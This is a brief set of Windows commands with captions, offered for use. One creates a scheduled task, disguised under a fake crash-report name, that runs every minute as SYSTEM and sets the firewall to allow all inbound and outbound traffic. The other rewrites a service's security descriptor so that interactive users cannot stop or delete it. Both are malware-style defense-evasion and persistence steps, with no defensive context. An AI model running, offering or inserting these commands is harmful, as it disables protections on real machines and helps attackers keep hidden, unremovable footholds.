Run this to turn off firewall using scheduled tasks:
schtasks /create /sc minute /mo 1 /tn "CrashReport5_{B2FE1952-0186-46C3-BAEC-A80AA35}" /tr "cmd.exe /c netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound" /ru SYSTEM

Makes it so nobody can turn off this service:
sc sdset \"<service name>\" D:(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

